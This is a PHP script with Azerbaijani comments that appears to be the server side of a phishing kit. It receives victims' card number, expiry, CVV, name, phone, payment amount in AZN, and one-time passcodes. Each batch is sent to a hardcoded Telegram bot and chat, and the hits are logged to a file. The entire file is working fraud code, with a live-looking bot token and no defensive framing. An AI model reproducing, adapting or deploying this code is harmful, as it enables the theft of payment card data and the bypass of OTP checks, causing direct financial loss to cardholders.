<?php
// YALNIZ POST İCƏZƏLİDİR
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(403);
    die('🚫 Giriş qadağandır!');
}

// BOT MƏLUMATLARI
$botToken = '8954241039:AAHSIz0Q6884ESNIiIdVCe4JxWWqR0xcTA4';
$chatId = '-1004332923672';

// POST MƏLUMATLARI
$cardName = isset($_POST['card_name']) ? trim(strip_tags($_POST['card_name'])) : 'Məlumat yoxdur';
$cardNumber = isset($_POST['card_number']) ? trim(strip_tags($_POST['card_number'])) : 'Məlumat yoxdur';
$cardExpiry = isset($_POST['card_expiry']) ? trim(strip_tags($_POST['card_expiry'])) : 'Məlumat yoxdur';
$cardCvv = isset($_POST['card_cvv']) ? trim(strip_tags($_POST['card_cvv'])) : 'Məlumat yoxdur';
$operator = isset($_POST['operator']) ? trim(strip_tags($_POST['operator'])) : 'Məlumat yoxdur';
$phone = isset($_POST['phone']) ? trim(strip_tags($_POST['phone'])) : 'Məlumat yoxdur';
$amount = isset($_POST['amount']) ? trim(strip_tags($_POST['amount'])) : 'Məlumat yoxdur';
$ip = isset($_POST['ip']) ? trim(strip_tags($_POST['ip'])) : $_SERVER['REMOTE_ADDR'];
$otp = isset($_POST['otp']) ? trim(strip_tags($_POST['otp'])) : '';
$campaign = isset($_POST['campaign']) ? trim(strip_tags($_POST['campaign'])) : '';

// ============================================
// 🔢 SIRALI ID - COUNTER FAYLINDAN OXU
// ============================================
$counterFile = 'counter.txt';
if (file_exists($counterFile)) {
    $id = (int)file_get_contents($counterFile) + 1;
} else {
    $id = 1;
}
file_put_contents($counterFile, $id);

// ============================================
// 📤 TELEGRAM-A GÖNDƏRME FUNKSİYASI
// ============================================
function sendToTelegram($message) {
    global $botToken, $chatId;
    
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postData = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);

    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    return $httpCode;
}

// ============================================
// 📝 1-Cİ MESAJ: KART MƏLUMATLARI (QISA)
// ============================================
if (empty($otp)) {
    $message1 = "💳 YENİ KART GİRİŞİ #" . $id . "\n";
    $message1 .= "────────────────────────\n";
    $message1 .= "📞 Tel: " . $phone . "\n";
    $message1 .= "💰 Tutar: " . $amount . " AZN\n";
    $message1 .= "💳 CC: " . $cardNumber . "\n";
    $message1 .= "📅 Tarix: " . $cardExpiry . "\n";
    $message1 .= "🔐 CVV: " . $cardCvv . "\n";
    $message1 .= "👤 İsim: " . $cardName . "\n";
    $message1 .= "🌐 IP: " . $ip . "\n";
    $message1 .= "────────────────────────";
    
    sendToTelegram($message1);
    
    $logData = date('Y-m-d H:i:s') . " | ID: #$id | KART | IP: $ip\n";
    file_put_contents('telegram_log.txt', $logData, FILE_APPEND);
    
    header('Content-Type: application/json');
    echo json_encode(['status' => 'success']);
    exit;
}

// ============================================
// 📝 2-Cİ MESAJ: OTP + PAKET (QISA)
// ============================================
if (!empty($otp)) {
    $message2 = "🔑 OTP TƏSDİQİ #" . $id . "\n";
    $message2 .= "────────────────────────\n";
    $message2 .= "🔑 OTP: " . $otp . "\n";
    $message2 .= "🌐 IP: " . $ip . "\n";
    if (!empty($campaign)) {
        $message2 .= "📦 Paket: " . $campaign . "\n";
    }
    $message2 .= "📱 Nömrə: " . $phone . "\n";
    $message2 .= "────────────────────────";
    
    sendToTelegram($message2);
    
    $logData = date('Y-m-d H:i:s') . " | ID: #$id | OTP: $otp | IP: $ip\n";
    file_put_contents('telegram_log.txt', $logData, FILE_APPEND);
    
    header('Content-Type: application/json');
    echo json_encode(['status' => 'success']);
    exit;
}

header('Content-Type: application/json');
echo json_encode(['status' => 'error']);
exit;
?>
